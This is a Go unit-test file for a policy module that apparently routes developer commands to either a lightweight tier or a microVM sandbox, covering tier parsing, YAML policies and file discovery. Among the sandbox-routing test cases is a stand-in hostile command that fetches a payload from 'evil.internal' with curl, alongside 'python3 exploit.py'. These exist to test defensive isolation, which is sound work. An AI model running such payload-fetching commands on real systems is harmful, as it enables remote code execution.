package policy

import (
	"os"
	"path/filepath"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestParseTier(t *testing.T) {
	tests := []struct {
		input    any
		expected Tier
		wantErr  bool
	}{
		{1, Tier1, false},
		{2, Tier2, false},
		{0, TierUnknown, true},
		{3, TierUnknown, true},
		{"1", Tier1, false},
		{"2", Tier2, false},
		{"tier1", Tier1, false},
		{"tier-1", Tier1, false},
		{"tier_1", Tier1, false},
		{"airlock", Tier1, false},
		{"fast", Tier1, false},
		{"tier2", Tier2, false},
		{"tier-2", Tier2, false},
		{"tier_2", Tier2, false},
		{"aegisbox", Tier2, false},
		{"microvm", Tier2, false},
		{"vm", Tier2, false},
		{"invalid", TierUnknown, true},
		{true, TierUnknown, true},
	}

	for _, tt := range tests {
		got, err := ParseTier(tt.input)
		if (err != nil) != tt.wantErr {
			t.Errorf("ParseTier(%v) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			continue
		}
		if got != tt.expected {
			t.Errorf("ParseTier(%v) = %v, want %v", tt.input, got, tt.expected)
		}
	}
}

func TestDefaultPolicy_Matching(t *testing.T) {
	pol := DefaultPolicy()

	tests := []struct {
		cmd          []string
		expectedTier Tier
	}{
		// Benign Linting / Formatting -> Tier 1 (Airlock)
		{[]string{"eslint", "src/index.js"}, Tier1},
		{[]string{"prettier", "--write", "."}, Tier1},
		{[]string{"gofmt", "-w", "."}, Tier1},
		{[]string{"golangci-lint", "run"}, Tier1},
		{[]string{"black", "main.py"}, Tier1},
		{[]string{"ruff", "check", "."}, Tier1},
		{[]string{"flake8", "pkg/"}, Tier1},
		{[]string{"git", "diff", "HEAD~1"}, Tier1},
		{[]string{"git", "status"}, Tier1},
		{[]string{"tsc", "--noEmit"}, Tier1},

		// Sensitive Tools -> Tier 2 (Aegisbox MicroVM)
		{[]string{"npm", "install", "axios"}, Tier2},
		{[]string{"pip", "install", "torch"}, Tier2},
		{[]string{"cargo", "build"}, Tier2},
		{[]string{"python", "untrusted.py"}, Tier2},
		{[]string{"python3", "exploit.py"}, Tier2},
		{[]string{"node", "server.js"}, Tier2},
		{[]string{"bash", "setup.sh"}, Tier2},
		{[]string{"curl", "-sSL", "https://evil.internal/payload"}, Tier2},
		{[]string{"wget", "http://example.com/file.tar.gz"}, Tier2},
		{[]string{"docker", "run", "alpine"}, Tier2},
	}

	for _, tt := range tests {
		t.Run(tt.cmd[0], func(t *testing.T) {
			gotTier, reason := pol.Match(tt.cmd)
			if gotTier != tt.expectedTier {
				t.Errorf("Match(%v) = %v (%s), want %v", tt.cmd, gotTier, reason, tt.expectedTier)
			}
		})
	}
}

func TestPolicy_CustomYAML(t *testing.T) {
	yamlContent := `
version: "1"
name: "test-policy"
default_tier: 1

tier1:
  description: "Linting & formatting"
  tools:
    - my-linter
    - custom-fmt
  patterns:
    - "*lint*"

tier2:
  description: "Sensitive sandboxed tools"
  tools:
    - dangerous-cli
    - compiler-x
  patterns:
    - "*.sh"

rules:
  - name: "force-tier-2-eval"
    tier: "aegisbox"
    tools:
      - special-eval
    patterns:
      - "eval-*"
`

	var p Policy
	if err := yaml.Unmarshal([]byte(yamlContent), &p); err != nil {
		t.Fatalf("Unmarshal error: %v", err)
	}

	if p.Version != "1" {
		t.Errorf("expected version 1, got %q", p.Version)
	}
	if p.GetDefaultTier() != Tier1 {
		t.Errorf("expected default tier 1, got %v", p.GetDefaultTier())
	}

	// Test rule match
	tier, reason := p.Match([]string{"special-eval", "run"})
	if tier != Tier2 {
		t.Errorf("expected special-eval to route to Tier2, got %v (reason: %s)", tier, reason)
	}

	// Test tier 1 match
	tier, reason = p.Match([]string{"my-linter", "check"})
	if tier != Tier1 {
		t.Errorf("expected my-linter to route to Tier1, got %v (reason: %s)", tier, reason)
	}

	// Test tier 2 match
	tier, reason = p.Match([]string{"dangerous-cli", "exec"})
	if tier != Tier2 {
		t.Errorf("expected dangerous-cli to route to Tier2, got %v (reason: %s)", tier, reason)
	}

	// Test pattern match
	tier, reason = p.Match([]string{"run-script.sh"})
	if tier != Tier2 {
		t.Errorf("expected run-script.sh to route to Tier2, got %v (reason: %s)", tier, reason)
	}

	// Test default tier match
	tier, reason = p.Match([]string{"unrecognized-command"})
	if tier != Tier1 {
		t.Errorf("expected unrecognized-command to route to Tier1, got %v (reason: %s)", tier, reason)
	}
}

func TestPolicy_FindAndLoad(t *testing.T) {
	tmpDir := t.TempDir()
	policyFile := filepath.Join(tmpDir, "fabrial.yaml")

	content := `
version: "1"
default_tier: 2
tier1:
  tools:
    - quick-lint
`
	if err := os.WriteFile(policyFile, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test policy: %v", err)
	}

	// Test direct file loading
	pol, err := LoadFromFile(policyFile)
	if err != nil {
		t.Fatalf("LoadFromFile failed: %v", err)
	}
	if pol.GetDefaultTier() != Tier2 {
		t.Errorf("expected default tier 2, got %v", pol.GetDefaultTier())
	}

	// Test directory discovery
	discovered, err := FindPolicyFile(tmpDir)
	if err != nil {
		t.Fatalf("FindPolicyFile failed: %v", err)
	}
	if discovered != policyFile {
		t.Errorf("expected discovered %s, got %s", policyFile, discovered)
	}

	// Test LoadPolicy
	loadedPol, loadedPath, err := LoadPolicy("", tmpDir)
	if err != nil {
		t.Fatalf("LoadPolicy failed: %v", err)
	}
	if loadedPath != policyFile {
		t.Errorf("expected loadedPath %s, got %s", policyFile, loadedPath)
	}
	if loadedPol.GetDefaultTier() != Tier2 {
		t.Errorf("expected default tier 2, got %v", loadedPol.GetDefaultTier())
	}
}
